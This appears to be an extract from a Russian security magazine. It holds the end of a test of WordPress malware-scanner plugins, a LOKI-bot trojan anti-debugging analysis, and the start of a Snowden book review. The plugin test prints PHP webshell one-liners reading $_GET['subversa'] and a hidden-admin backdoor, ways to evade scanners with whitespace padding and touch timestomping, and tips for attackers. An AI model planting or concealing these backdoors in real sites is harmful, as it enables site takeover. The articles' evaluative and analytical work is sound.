 • wpcontent/w50.php — веб‐шелл;
 • wpcontent/c—7.php — веб‐шелл;
 • wpcontent/themes/index.php — shell_exec();
 • wpcontent/plugins/index.php — shell_exec();
 • wpcontent/index.php — shell_exec() + модификация файла ядра;
 • wpcontent/themes/corrupted/footer.php — system().

Обратим внимание на то, как модуль сканирования распознает файлы /wp‐
content/index.php и /wp‐content/themes/index.php с /wp‐content/plu‐
gins/index.php: первый оценивается как модифицированный файл ядра
и попадает в отчет дваж ды, а вот другие два уже нет. Почему — загадка.
Справедливости ради замечу, что около полугода назад файл /wp‐content/
index.php также не считался файлом ядра.
   Что не было обнаружено (8/20):
 • wpcontent/subversa.php — веб‐шелл;
 • wpcontent/simple.shtml — веб‐шелл;
 • wpcontent/plugins/heIIo.php —  поддельный  плагин,  записы‐
  вающий код бэк дора в файл shadow.php;
 • wpcontent/plugins/shadow.php — бэкдор;
 • wpcontent/themes/corrupted/404.php — скрытый загрузчик фай‐
   лов;
 • wpcontent/themes/corrupted/header.php  —   require_once
  get_template_directory() . '/inc/ghostuser.php;
 • wpcontent/themes/corrupted/inc/ghostuser.php — код, добав‐
  ляющий скрытого администратора сай та;
 • wpcontent/themes/twentysixteen/header.php —  скрытый  заг‐
   рузчик файлов.





  Страница «Поль зователи» со скрытой учетной записью админис тратора

Вполне ожидаемо, что были выявлены наиболее популярные веб‐шел лы,
однако  «мимо  радаров»  прошли   заг рузчики  файлов  вмес те   с
require_once().  Интерес но  то,  что  два  веб‐шел ла  без  обфускации
под подозрение не попали совсем (к вопросу об избыточности кода). Кроме
того, весьма странно, что изменения темы Twenty Sixteen также не попали
под подозрение, равно как и создание еще одно го пользователя с правами
администратора и последующим его сокрытием со страницы «Пользовате‐
ли».





  Результат очередного ска нирования Wordfence Security — Firewall & Mal‐
  ware Scan

Хорошо, исключим шесть обна руженных веб‐шел лов из дальнейшей работы,
а выявленные «закладки» попробуем доработать:
 • wpconfig.php — меня ем код на $sy=system;$sy($_GET["subver
  sa"]); ;
 • wpconfigsample.php — меняем код на $pt=passthru;$pt($_GET[
  "subversa"]);exit(); ;
 • /wpcontent/index.php, /wpcontent/plugins/index.php, /wp
  content/themes/index.php — меняем код на $sh=shell_exec;echo
  $sh($_GET["subversa"]); во всех трех файлах;
 • wpcontent/themes/corrupted/footer.php  —   меняем   код
   на $sy=system;$sy($_GET["subversa"]); .

После этого вновь запустим ска нирование и пос мотрим, будут ли выявлены
эти «закладки» вновь.





  Еще один запуск сканирования Wordfence Security — Firewall & Malware
  Scan дал такой результат

На этот раз выявлено 2/14 угроз:
 • wpcontent/themes/corrupted/footer.php — system() ;
 • /wpcontent/index.php — модификация файла ядра.

Изменения файла /wp‐content/index.php вызовут срабатывание в любом
случае, поэтому возвра щаем его к первоначальному виду, а «закладку»
в файле wp‐content/themes/corrupted/footer.php немного видоизме ним
и запустим повторное ска нирование:
 • wpcontent/themes/corrupted/footer.php —  добавляем  око‐
   ло 200 пробелов перед $sy=system;$sy($_GET["subversa"]); .





  Полное сокрытие вредонос ного кода в «стандартном» режиме сканиро‐
  вания

Результат превосходит все ожидания: 0/13.
  Но это «стандартный» тип сканирования, а что будет на «параноидаль‐
ном»? Включаем режим High Sensitivity в нас трой ках сканирования и запус‐
каем еще одну проверку.





        Активация «параноидаль ного режима» на странице настроек





  В «параноидальном режиме» выявлена лишь модификация оригиналь‐
  ной темы оформления

Результат: 1/13.
  Модуль сканирования выявил модификацию фай ла wp‐content/themes/
twentysixteen/header.php темы Twenty Sixteen. При чем уровень угрозы
оценивается как Medium, то есть средний. Пла гин ссылается на то, что
модификацию файла мог выполнить и сам пользователь. Вооб ще огонь!
   «Уплывшие» файлы cookies плагин Wordfence Security — Firewall & Malware
Scan ни разу не заметил.


Sucuri Security — Auditing, Malware Scanner and Security Hardening
Шутки ради стоило запустить этот плагин безопас ности, чтобы увидеть зак‐
лючение по текуще му состоянию сайта: All Core Wordpress Files Are Correct.
Хитрость этого решения в том, что модуль сканирования по базовым сиг‐
натурам работает толь ко при наличии годовой подписки, цена которой сос‐
тавляет от 200 дол ларов.





                              All Core Wordpress Files Are Correct


Anti-Malware Security and Brute-Force Firewall
Еще одно потрясающее решение, которое можно найти в репозитории. Итак,
запускаем полную проверку и внимательно изучаем результат: 1768 фай лов
просканировано, 446 файлов пропущено (.CSS, .PNG, .GIF и так далее) и...
выявлено восемь потенциальных угроз!





      Итог работы плагина Anti‐Malware Security and Brute‐Force Firewall

Вот эти опасные, по мнению плагина, файлы:
 • wpadmin/includes/classpclzip.php
 • wpincludes/js/json2.js
 • wpincludes/js/json2.min.js
 • wpincludes/js/twsack.js
 • wpincludes/js/twsack.min.js
 • wpincludes/js/jquery/jquery.form.min.js
 • wpincludes/js/jquery/jquery.schedule.js
 • wpincludes/js/tinymce/tiny_mce_popup.js

В общем, восемь ложных срабатываний и ничего даже близ ко похожего
на наши «закладки». Но не будем спешить с вывода ми, так как у данного пла‐
гина есть интересная опция, работа ющая «из короб ки»: Upload PHP File Pro‐
tection. У нас как раз есть загрузчики файлов, так что тест этой функции нап‐
рашивается сам собой.





             Результат при попытке заг рузить файл .PHP





            Опция Upload PHP File Protection в действии

После вклю чения это го режима мы видим сооб щение: You have been redirect‐
ed here from hacked.wordpress which is protected by GOTMLS Anti‐Malware.
Неплохо! Файл mini_b374k.php он загрузить не дал, а вот сме на рас ширения
позволила веб‐шеллу проскочить со свистом аж нес колько раз: *.shtml, *.
php5, *.php7 и так далее. Думаю, суть ты уловил.


Cerber Security, Antispam & Malware Scan
Пожалуй, самый интересный продукт из всех рас смот ренных в статье. Менее
чем за минуту выполнено полное ска нирование, итогом которого  ста‐
ли 14 предупреждений. Итак, вот они:
 • wpconfig.php — обнаружен подозрительный код (крит.);
 • wpconfigsample.php — несовпадение кон трольной суммы файла
    (крит.);
 • wpcontent/plugins/heIIo.php — обнаружен подозрительный код
    (крит.);
 • wpcontent/themes/twentysixteen/inc/fakefile.php — не свя‐
   занный с системой файл;
 • wpcontent/themes/twentysixteen/header.php — несовпадение
   контрольной суммы файла (крит.);
 • wpcontent/themes/twentysixteen/404.php — несовпадение кон‐
   трольной суммы файла (крит.);
 • wpcontent/themes/corrupted/functions.php  —   обнаружен
   подозрительный код (крит.);
 • wpcontent/themes/corrupted/footer.php — обнаружен  подоз‐
   рительный код (крит.);
 • wpcontent/plugins/index.php — обнаружен подозрительный код
    (крит.);
 • wpcontent/themes/index.php — обнаружен подозрительный код
    (крит.);
 • wpcontent/subversa.php — обнаружен вредоносный код (крит.);
 • wpcontent/simple.shtml — обнаружен вредоносный код (крит.).

Еще два пре дупреждения касались плагина и темы, которых нет в репози‐
тории, и, соответственно, целостность файлов не проверить — не с чем срав‐
нивать.





  Результат сканирования плагином Cerber Security, Antispam & Malware
  Scan

Отличный результат, тем более что плагин не требует каких‐то платных под‐
писок для локального ска нирования файлов. Разумеется, он не без изъянов:
по своему опыту скажу, что обмануть «Цербера» можно с помощью все той же
обфускации, да и загрузке файлов он даже не дума ет пре пятствовать, но это
уже совсем другая история. Из того, что этот сторожевой пес пропустил:
 • wpcontent/plugins/shadow.php — бэкдор;
 • wpcontent/themes/corrupted/404.php — скрытый загрузчик фай‐
   лов;
 • wpcontent/themes/corrupted/inc/ghostuser.php — код, добав‐
  ляющий скрытого администратора сай та.

Также  есть  возможность обманывать модуль  сканирования,  используя
для модифицированных файлов команду touch с параметрами ‐a ‐m ‐t:


$ touch ‐a ‐m ‐t 201911081434.21 shadow.php

Этой командой дата и время доступа и изменения для файла shadow.php
были установлены на 201911081434.21, то есть 2019 год, 11 — месяц, 08 —
число, 14 — часы, 34 — минуты, 21 — секунды.

Бо нус: «Ай‑Болит»
Чтобы немного разнооб разить ассорти мент мал вари и инструментов, я пред‐
лагаю оценить в деле работу популярнейшего «Ай‐Болита», который нах‐
валивают сильнее всех перечисленных в статье плагинов безопасности,
вместе взятых. А затем пос мотреть на результат работы таких плагинов про‐
тив спам‐страниц, которых я закину на тес товый сайт чуть более 4000 штук.
Спам‐страницы — это прос то рекламные веб‐страницы, содержащие текст
с большим количеством поискового спама. Их я позаимс твовал на одном
из взломанных Wordpress‐сайтов, с которым мне пришлось разбираться
не так давно.
  К CMS Wordpress «Ай‐Болит» прямого отно шения не имеет, но многими он
воспринимается как «волшебная таб летка» и даже иногда навязы вается
в качестве необходимой платной услуги некоторыми хостинг‐компани ями,
если сайт клиента был скомпрометирован.
   Итак, скачиваем «Ай‐Болит» для сай тов (версия от 27.02.2019 03:09), заг‐
ружаем файлы в кор невую директорию тестового сайта и в консоли запус‐
каем проверку:


$ php ai‐bolit.php —skip=jpg,png,gif,jpeg,JPG,PNG,GIF,bmp,xml,zip,
rar,css,avi,mov —mode=2 —size=2048K

Я добавил опцию пропуска файлов с расширениями jpg, png, gif, jpeg, JPG,
PNG, GIF, bmp, xml, zip, rar, css, avi, mov, уста новил максимальный размер ска‐
нируемых файлов на 2048 Кбайт, а тип сканирования выбрал «параноидаль‐
ный». К слову сказать, это единс твенный режим «Ай‐Болита», в котором он
способен найти хоть что‐то, вываливая попутно кучу false positives, то есть
ложных срабатываний. Отчего отчет пос ле ска нирования разбирать довольно
муторно.





              Отчет о проделанной работе «Ай‐Болита»

Казалось бы, для такого популярного и мощ ного инстру мента это ерундовая
задачка,  но...  из ~4000  спам‐стра ниц  выявлено менее 200  (то  есть
менее 5%), а из 14 закладок найдены всего 2 — загрузчики фай лов (14,3%).
Как видим, картина очень далека от идеальной, особенно учитывая воз‐
можность чуть «замаскировать» загрузчи ки файлов. Тогда счетчик выяв‐
ленных «закладок», вероятно, вообще будет равен нулю.
  При том же количестве спам‐страниц плагины безопас ности Wordpress
показали такие результаты:
 • Wordfence Security — Firewall & Malware Scan — 474 спам‐страницы выяв‐
   лено из ~4000 (при 39 967 про веренных ссылках), то есть 11,8%;
 • Anti‐Malware Security and Brute‐Force Firewall — выявлено 9 спам‐страниц,
   то есть 0,2%;
 • Cerber Security, Antispam & Malware Scan — всего 6 спам‐страниц, то
   есть 0,15%.

В общем, если воспринимать такого рода пла гины как инструменты для обес‐
печения безопасности, то про эту самую безопас ность можно благополучно
забыть.


ВЫВОДЫ
Как ты мог убедиться, количество активных уста новок плагина и хвалебные
отзывы ничего не говорят о качес тве продукта. Равно как и наличие плагина
в репозитории Wordpress не гарантирует вооб ще ничего. Ежедневное попол‐
нение WPScan Vulnerability Database новыми данными об уязвимых плагинах
и темах тоже не гарантирует успешного выявления всех потенциальных угроз.
Так о чем речь в итоге?
   Если подумать над полученной информа цией, то можно понять, что
на самом деле нам не предлага ют готовые самостоятельные решения,
а показывают демоверсии сервисов, дос тупных по под писке. Иначе говоря,
создавать и бесплатно рас пространять эффективный и мощный инстру мент,
выявляющий всевозможную малварь, финансово невыгодно для любой ком‐
пании. О выгоде клиента, разумеется, речи вообще не идет: плати, и твоя
проблема будет решать ся штат ными специалис тами. Все бы хорошо, но с
точки зрения клиента эта модель экономически оправданна, только если его
сайт будут взламывать регулярно, тог да смысл платной под писки понятен.
С другой же стороны, регулярные взломы при наличии подписки означают
низкий уровень оказываемых услуг, что также вызыва ет вопросы. Замкнутый
круг.
   Как быть? Тебе решать, зап латить профес сиона лу за работу «под ключ»,
сидеть на платной подписке и кормить целую команду разработчиков
или самостоятельно пытать ся решить проб лему «за пару кликов мышью»
в надежде на благоприятный исход. Как по мне, лучше и выгоднее все же
заранее нанять специалиста для аудита безопасности или, если сайт уже
скомпрометирован, для восстановления работос пособности ресурса.


Взгляд со сто роны атакующего
 1. Не надо внедрять «закладки» куда попало: по возможности изучи сис тему,
   которую атакуешь, чтобы потом было мень ше сюрпризов и неожидан‐
   ностей.
 2. Говоря конкретно про CMS Wordpress: забудь о модификациях чего‐либо
   в директориях /wpadmin/ и /wpincludes/, а также плагинов и тем
   из репозитория, равно как и файлов из корневой директории CMS — все
   твои труды «смоются» при штатном обновлении или при форсированной
   переустановке движка.
 3. Проявляй фантазию и изобретательность, но не забывай, что краткость —
   сестра талан та. Иными сло вами, не надо пытать ся внедрить как можно
   больше фишек в свой код, в перспективе усложняя себе этим жизнь.
  Простота, элегантность и нешаблонность мышления — наиболее выиг‐
  рышная стратегия.


Взгляд со сто роны защищающегося
 1. Откажись от всевозможных полумер в работе.
 2. Не стоит уповать на популярные «плагины безопас ности» — это лишь под‐
   спорье (часто сомнитель ное), а не решение на все случаи жизни.
 3. «Варез» на сво их проектах — выстрел себе же в ногу (или в обе).
 4. Если ты работаешь с программистом и принима ешь проект, то старайся
   не портить с ним отно шения и не мудрить с опла той — это уменьшает твои
  шансы принять сайт с неприятными бонусами в виде «закладок».
 5. Техподдержка большинс тва хостинг‐компаний откажет тебе в восстанов‐
   лении ресурса, если тот был скомпромети рован, зато с большой веро‐
   ятностью предложит плат ную услугу чистки сайта тем же «Ай‐Болитом».

И заранее позаботься о бэкапах! Прописная исти на, которую час тенько игно‐
рируют.
ВЗЛОМ

     РАЗБИРАЕМ
      LOKI-BOT


                       КАК УСТРОЕНЫ
                     МЕХАНИЗМЫ
                      АНТИОТЛАДКИ
                    БАНКОВСКОГО
                           ТРОЯНА





                                                                                         Nik Zerof
                                                                                             xtahi0nix@gmail.com





Исследовать малварь не только весело, но и крайне поз‐
навательно. Недавно в мои цепкие руки попал банковский
троян LOKI‐bot. Подобные вре доносы обычно пишут нас‐
тоящие профессионалы, и потому бан керы зачастую содер‐
жат достаточно интересные хаки. Так случилось и в этот
раз — трой сопротивляется отладке и пытается «спалить»
нас довольно нет ривиальными способа ми.


Для начала загрузим семпл в DiE и посмотрим, что он покажет.





                        LOKI в анализа торе DiE

Как видно на скрин шоте, DiE отчего‐то уверен, что наш семпл написан на Del‐
phi, но это, разумеется, не так. Ты наверняка знаешь, что существу ют спе‐
циальные тулзы, которые умеют склеивать один файл с другим. Соз датели
LOKI‐bot именно так и пос тупили (обрати внимание на размер секции ресур‐
сов rsrc в файле относительно его общего раз мера). Оригинальный LOKI
запустится после того, как отработа ет его «обертка».


             INFO

                     Все эксперименты с боевой малварью я нас‐
                        тоятельно рекомендую проводить на изолирован‐
                      ной от сети виртуальной машине, иначе есть риск
                        получить заражение банкером LOKI‐bot и лишить‐
                        ся своих данных!


Для того чтобы разоб раться в механизме самозащиты этого бота, мы дол жны
представ лять себе, каким образом вообще мал варь может сопротивляться
отладке. Обычно так или ина че трой старается получить список процессов
в системе, а после это го уже начинаются дальнейшие действия. Давай поп‐
робуем двигаться в эту сторону, чтобы изу чить механизм самозащиты бота.
Как известно, получить список процессов в Windows можно несколькими спо‐
собами.
 1. Перечислить процессы при помощи функции PSAPI EnumProcesses.
 2. Создать снимок процес сов при помощи функции CreateToolhelp32S
  napshot.
 3. Перечислить процессы при помощи ZwQuerySystemInformation.
 4. Применить трю ки со счет чиками производительности.
 5. Использовать Windows Management Instrumentation (WMI).

Безусловно, самый  рас простра ненный метод  получения процес сов —
при помощи функции CreateToolhelp32Snapshot, поэтому мы начнем
с установки брейк‐пойнта на эту функцию (исполь зуется отладчик x64dbg,
версия для архитектуры x86).


             INFO

                    Исследование малвари или решение крякмисов
                     может растянуться надолго: не всегда с первого
                       раза ты ставишь брейк‐пойнты на нужные фун‐
                         кции, не всегда все идет по плану. В любом слу‐
                        чае это вереница проб и ошибок. Когда ты чита‐
                    ешь статью, у тебя на это уходит максимум 10–
                     15 минут, но это не значит, что любой взлом
                      или снятие упаковки с файла будет занимать
                        столько же  времени. Просто  есть  «рабочие»
                    момен ты,  рутина,  которой не  стоит утомлять
                         читателя и которую автор пропускает. Поэтому
                       создается впечатление, будто любой взлом быстр
                      и элементарен, а автор с первого раза «угадыва‐
                            ет», на какие фун кции WinAPI установить бряки,
                         что бы победить защиту. Но в жиз ни это не всегда
                            так! :)



НАЧИНАЕМ ПОГРУЖЕНИЕ
Итак, мы оказались в теле функции CreateToolhelp32Snapshot. Давай
выпол ним ее и сделаем еще один шаг, чтобы вернуться по ret. В итоге мы
попадаем в такой код:


01DC40D8 | 53                       | push ebx
01DC40D9 | 6A 02                    | push 2
01DC40DB | FF56 0C                  | call dword ptr ds:[esi+C]
01DC40DE | 8BD8                     | mov ebx,eax   <‐‐‐‐‐ мы здесь
01DC40E0 | 83FB FF                  | cmp ebx,FFFFFFFF
01DC40E3 | 0F85 634C0000            | jne 1DC8D4C
01DC40E9 | 33C0                     | xor eax,eax
01DC40EB | E9 6AE5FFFF              | jmp 1DC265A

Мы стоим на 01DC40DE, но ты ведь помнишь, что мы только что вернулись
из CreateToolhelp32Snapshot? Ста ло быть,  call, который выше по коду,
и есть вызов CreateToolhelp32Snapshot. Вспоминаем прототип Create‐
Toolhelp32Snapshot:


HANDLE CreateToolhelp32Snapshot(
    DWORD dwFlags,
    DWORD th32ProcessID
);

Как видим, передаются два аргу мента, один из которых — push  2, что
говорит о передаче парамет ра TH32CS_SNAPPROCESS. Он заставляет Create‐
Toolhelp32Snapshot  сделать  снимок  всех  процессов.  Все  указывает
на вызов CreateToolhelp32Snapshot, но этот call не похож на стандартный
вызов WinAPI в коде. Идем в ds:[esi+C] и смот рим, что там есть.





                  Вид «сырой» памяти в ds:[esi+C]

Видим какой‐то код, похожий на мусор, среди которо го прос леживаются име‐
на функций WinAPI. Давай предста вим весь код в виде DWORD’ов.





             Име на функций, получаемых динами чес ки

Перед нами список функций, которые LOKI получает динамичес ки. По этому
списку мы можем судить о том, как работа ет банкер. В дальнейшем вызовы
используемых WinAPI будут выполнять ся подобными call’ами. Итак, со спис‐
ком WinAPI разобрались, теперь вернемся в код. Чтобы ты понимал его струк‐
туру, приведу листинг час ти функции поиска процессов (обрати внимание
на адреса!):


; CreateToolhelp32Snapshot
01DC40DB | FF56 0C        | call dword ptr ds:[esi+C]
01DC40DE | 8BD8           | mov ebx,eax
01DC40E0 | 83FB FF        | cmp ebx,FFFFFFFF
01DC40E3 | 0F85 634C0000  | jne 1DC8D4C
01DC40E9 | 33C0           | xor eax,eax
01DC40EB | E9 6AE5FFFF    | jmp 1DC265A


00228D4C | 8D85 D4FDFFFF  | lea eax,dword ptr ss:[ebp‐22C]
00228D52 | 50             | push eax
00228D53 | E9 53ABFFFF    | jmp 2238AB


002238AB | 53             | push ebx
002238AC | 89BD D4FDFFFF  | mov dword ptr ss:[ebp‐22C],edi
; Process32FirstW
002238B2 | FF56 10        | call dword ptr ds:[esi+10]
002238B5 | E9 97EDFFFF    | jmp 222651

Как видишь, код сильно фрагментирован и связан переходами (jmp). Это нас
не запугает: ставим точку оста нова на конец функции получения списка про‐
цессов и жмем на выполнение. Далее нас ждет такой код (некоторые не осо‐
бо интересные функции я буду называть, но не стану в них заглядывать —
по названию будет все понятно):


; Имя процесса
007C5D83 | 8D8D F8FDFFFF  | lea ecx,dword ptr ss:[ebp‐208]
; Считаем число символов имен процессов
007C5D89 | E8 4AD8FFFF    | call <str_len>
; Сравниваем размер имени процесса с числом 40h (64)
007C5D8E | 83F8 40        | cmp eax,40
; Все хорошо, продолжаем корректное выполнение трояна
007C5D91 | 0F82 08000000  | jb 7C5D9F
; Все плохо, завершаемся
007C5D97 | 6A 00          | push 0
; ExitProcess
007C5D99 | FF96 AC000000  | call dword ptr ds:[esi+AC]
007C5D9F | E9 E1D1FFFF    | jmp 7C2F85

Здесь считается размер имени каж дого про цес са и сравнивается с числом
40h, или 64 в десятеричной системе. Если процесс с таким длинным именем
найден, то выполняется выход. В чем тут был замысел?


ЗАМЫСЕЛ СОЗДАТЕЛЯ
Все дело в том, что обычно исследователи в вирусных лабораториях дают
имена файлам семплов вредоносных прог рамм в виде их хешей SHA‐256,
которые как раз име ют длину 64 символа. Если такой файл запустить, LOKI
поймет это по числу символов процес са и выполнит выход. Или не поймет?
Думаю, что внимательный читатель уже догадался: дело в том, что получа‐
емое при помощи функции CreateToolhelp32Snapshot имя процесса также
содержит его расширение, которое добавляет еще четыре символа к име‐
ни — .exe. Очевидно, разработ чик забыл об этом, поэтому его замысел
не сработает. Хотя идея дос таточно оригиналь на. Вывести из строя эту
защиту банкера можно, проследив, чтобы в сис теме не было процессов
с именами из 64 символов, включая расширение.
  На очереди сле дующая проверка.


002567B4 | 85C0           | test eax,eax
002567B6 | 0F85 07000000  | jne 2567C3
002567BC | 53             | push ebx
; ExitProcess
002567BD | FF96 AC000000  | call dword ptr ds:[esi+AC]
002567C3 | 56             | push esi
002567C4 | E8 D4DBFFFF    | call <check_name>
002567C9 | 59             | pop ecx
002567CA | 85C0           | test eax,eax

Я обозначил нужный call меткой <check_name>, чтобы было понятнее. Если
прыгнуть в него, можно увидеть такой код (я добавил комментарии, хоть код
и простой):


; Положим в память символ по адресу ss:[ebp‐28]
004C37B0 | 66:8945 D8   | mov word ptr ss:[ebp‐28],ax
004C37B4 | 58           | pop eax
; Берем символ
004C37B5 | 6A 6D        | push 6D
004C37B7 | 8BD0         | mov edx,eax
; Положим в память по адресу ss:[ebp‐26]
004C37B9 | 66:8955 DA   | mov word ptr ss:[ebp‐26],dx
004C37BD | 5A           | pop edx
; Берем символ
004C37BE | 6A 70        | push 70
; Положим в память по адресу ss:[ebp‐24]
004C37C0 | 66:8955 DC   | mov word ptr ss:[ebp‐24],dx
004C37C4 | 5A           | pop edx
004C37C5 | E9 6B2D0000  | jmp 4C6535

Очевидно, в память помеща ются зна чения, явля ющиеся кодами символов.
Давай пройдем этот код (это только фраг мент, код связан jmp’ами) и пос‐
мотрим на окно дампа, например в окрес тностях [ebp‐26].





                      Генера ция строк в памяти

В памяти сгенерированы сло ва self, sample, sandbox, virus, malware. Такой
подход к генерации нужных строк в памяти исполь зуется для того, чтобы
строковые константы не бросались в глаза в исполня емом файле LOKI.





              Строки сгенерирова ны, это видно в дампе

Далее идет вызов WinAPI GetModuleFileName:


004C7B13 | 6A 00        | push 0
; GetModuleFileName
004C7B15 | FF50 4C      | call dword ptr ds:[eax+4C]
004C7B18 | 85C0         | test eax,eax
004C7B1A | E9 73F4FFFF  | jmp 4C6F92

Так LOKI проверяет, не содержит ли имя его исполня емого файла этих слов,
и если содержит, то он сразу завершает работу. Кроме того, подобным обра‐
зом генерируются названия процессов популярных исследовательских прог‐
рамм, например ollydbg.exe, procmon.exe, procmon64.exe, windbg.exe, procex‐
p64.exe, и названия процессов антивиру са Avast — avgsvc.exe, iavgui.exe,
avastsvc.exe и так далее.
  После этого сгенерированные наз вания сверяются с полученным ранее
при помощи фун кции CreateToolhelp32Snapshot списком процессов. Что
интересно, проверяются процес сы только антивиру са Avast, дру гие LOKI
почему‐то не просматривает. Что бы успешно пройти и эту проверку, пере‐
именуй все приложения из списка или прос то не запускай их, иначе это спуг‐
нет LOKI и он завершится. А мы подходим к следующему антиотладочному
трюку.
  После проверки имен про цес сов мы видим такой код:


; ZwQueryInformationProcess
01D16CB7 | FF96 8C000000  | call dword ptr ds:[esi+8C]
01D16CBD | 397D FC        | cmp dword ptr ss:[ebp‐4],edi
01D16CC0 | E9 A8130000    | jmp 1D1806D

Очевидно, вызов ZwQueryInformationProcess здесь используется не прос‐
то так. Вспоминаем, что есть антиотладочный трюк, основанный на вызове
WinAPI ZwQueryInformationProcess. Смотрим, какие аргу менты переда‐
ются в эту функцию, попутно вспоминая ее про тотип:


NTSTATUS WINAPI ZwQueryInformationProcess(
    _In_      HANDLE           ProcessHandle,
    _In_      PROCESSINFOCLASS ProcessInformationClass,
    _Out_     PVOID            ProcessInformation,
    _In_      ULONG            ProcessInformationLength,
    _Out_opt_ PULONG           ReturnLength
);

Больше всего нас будут интересовать поля ProcessHandle и ProcessInfor‐
mationClass. Первое поле указывает на процесс, о котором мы получаем
информацию, второе — интересующий нас флаг. Отладчик показывает, что
первое поле имеет значение FFFFFFFF, а второе — 0x1f. Чтобы в этом убе‐
диться, посмотри, какие параметры переда ются в функцию через стек,
на скриншоте.
  Переданное значение FFFFFFFF в поле ProcessHandle говорит о том, что
мы работаем со своим собственным процес сом (GetCurrentProcess();).
Значение поля ProcessInformationClass 0x1f ука зывает на использование
ProcessDebugFlags, который сигнализирует о том, что процесс находится
под     отладкой.     Также     будет     проверен     флаг     0x1E
(ProcessDebugObjectHandle), который тоже ука зывает на отладку.





        Аргументы ZwQueryInformationProcess в стеке и ее вызов

Кстати, в «Хакере» была отдельная статья, которая описывала этот (и дру гие)
методы определе ния отладки.
   Ну а далее, разумеется, мы обна ружи ваем условный переход в зависи‐
мости от состояния ука занных выше флагов. Как его пре одолевать, ты и сам
знаешь: либо перескочить, уста новив регистр eip на нужный адрес, либо
забить nop’ами, либо поменять значение фла га перехода в отладчике. Лично
я просто поменял значение регистра eip на следующую после условного
перехода команду.
   Это был последний рубеж антиотладочной защиты LOKI, пос ле этого
начинает работать его полностью распакованное тело, о чем говорят дос‐
таточно интересные строки в снятом дампе.





                       Строки в дампе LOKI

Очевидно, LOKI соб рался стилить мои пароли из бра узе ра Firefox.


ИТОГ
В этой статье мы рассмот рели, какие уловки вирмейкеры применяют против
средств анализа бинарных файлов, на примере банкера LOKI‐bot. Какие‐то
способы были уже много раз описаны, какие‐то достаточно нетривиальны
по своему подходу. Но, как видишь, при помощи отладчика и дизассембле ра
они преодолеваются быс тро и эффективно.
ПРИВАТНОСТЬ

    СИ САДМИН
      ПРОТИВ
     СИ СТЕМЫ





                                                                                            atreau
                                                                                             zinik.alexander@gmail.com





                        О ЧЕМ
                   ЭДВАРД СНОУДЕН
                         НАПИСАЛ
                  В АВТОБИОГРАФИИ
                 PERMANENT RECORD




Знаменитый разоблачитель американ ской системы глобаль‐
ной слежки Эдвард Сно уден написал автобиографию. Его
книга уже успела стать бестселлером, а правительство США
подало на него новый иск и попыта лось лишить гонорара.
Мы изучили эту сенсационную книгу и расскажем, что инте‐
ресного в ней можно найти. Акцент, конечно, будет на тех‐
нических подробностях и тай нах американской разведки,
но и о жизни скрывающегося от все го мира автора тоже
поговорим.


ДЕТСТВО
Эдвард Сноуден родился 21 июня 1983 года. Но начинает рассказ о себе он
не со своего первого вздоха, а со своего первого взлома — который он
изящно называет также своим первым актом деятель ного протеста.
  Ему было шесть лет, и он уже давно протестовал против режима — а точ‐
нее, против режима дня. Ему казалось, что родители укладывают его спать
слишком рано. Гражданский диалог не действовал — влас ти были глухи к его
призывам. И тогда в день сво его рождения он тайком переставил все часы
в доме на несколько часов назад. Его вмешательство осталось не замечен‐
ным властями, и в тот день ему впер вые уда лось увидеть закат в день летнего
солнцестояния. Устав ликовать, он уснул на полу — а когда прос нулся, его
отец уже установил точное время на часах.
   Этот эпизод из личной жизни Сно удена не толь ко начинает повество‐
вание, но и служит в книге поводом порассуждать об устрой стве интернета,
о том, как изменился мир с его появлением (никто больше не подводит часы
вручную, все поль зуются про токо лом NTP на своих устрой ствах), — и бла‐
годаря гладкости этих переходов мыс ли становится понятно, что у Сноуде на
был соавтор, который очень сильно ему помогал.
  Профессиональный писатель Джошуа Коэн, которого кри тики сравнивают
с Филипом Ротом и Томасом Пинчоном, явно приложил много усилий, чтобы
превратить историю жизни Сноудена в литера турное повес твование, дос‐
тупное самому широкому кру гу читателей. У этого подхода есть свои плюсы
и минусы. Плю сы — книга вышла живой и увлекательной. Минусы — иногда
может показаться, что некоторые детали специально всплывают для того,
чтобы подчеркнуть какую‐то тему — или дать повод прочитать несведущему
читателю маленькую лекцию о том, как технология влияет на его незамыс‐
ловатую жизнь.


Кто такой Джо шуа Коэн
Соавтор книги Джо шуа Коэн родился в семье американских евреев. Он пуб‐
ликовался во многих престижных журналах. Среди его книг — постмодер‐
нистская фантасмагория на тему еврей ской истории и идентичности Witz
(один из смыслов названия — отсылка к концлагерю Аушвиц), а также «Книга
чисел» — метароман 2015 года о писателе Джошуа Коэне, который получил
заказ написать за технологичес кого миллиардера его автобиографию. Мил‐
лиардера, разумеется, тоже зовут Джошуа Коэн.
  Именно работая над «Книгой чисел», писатель заинтересовался воп‐
росами проникновения технологий в общес тво и ролью спецслужб в этом.
В том же 2015 году он написал роман PCKWCK — вари ацию на тему романа
Диккенса «Посмертные записки Пиквикского клу ба», только вместо англий‐
ских джентльменов путешес твуют по миру и творят дичь в нем наемные суб‐
подрядчики‐контракторы  американского  пра вительства  из  компании
PCKWCK.
   Кстати, PCKWCK писался в режиме реального времени — через трансля‐
цию в Periscope — и был опубликован вмес те с комментариями смотревших.
В общем, выбор соавтора для книги Сноудена мог быть и хуже. Даже с учетом
того, что литературный стиль Коэна несет на себе неиз гладимый отпечаток
работы на журналы категории «интеллектуальный глянец».



Что бы сто ять, я дол жен держаться корней
Детство Эдварда Сноудена прошло в двух маленьких городках на восточном
побережье  Америки —  Элизабет‐Сити  в  штате  Северная  Каролина
и Форт‐Мид, штат Мэриленд. Однако эти места не просто очередная никому
не известная глубинка, вро де города Хопкинс из сериала «Очень странные
дела». Про Форт‐Мид мы еще расска жем, а в Элизабет‐Сити находится круп‐
нейшая в стране база береговой охра ны США. В которой дед Сноуде на
по материнской линии дослужился до зва ния контр‐адмирала, а отец был
офицером. Кстати, оба — по инженерной час ти. Его мать работала клерком
в разных правительственных конторах.





  Одно из мест работы матери Сноудена — и сам он здесь тоже побывает

В общем, у семьи Сноудена славное прошлое и долгая история верной служ‐
бы родине. Здесь в норме хорошее обра зова ние и приличная зарплата. Все
эти подробности о семье призваны дать читателю понять: Сноуден с самого
детства рос с желанием служить своей стра не на совесть. Он любит Америку
и гордится своей историей — в частнос ти, историей борьбы за свободу. Эта
тема всплывает в книге много раз — вероятно, для американского читателя
это и правда необ ходимо, ведь мно гие там счи тают Сноудена пре дателем.
Вот ему и приходится отвечать — нет, мол, не предатель, а патриот. Да еще
и наследственный.


Игры учат жиз ни
Отец Сноудена, военный инженер, часто при носил с работы всякие интерес‐
ные вещи. То хронометр, то научный калькулятор — и все они вызывали
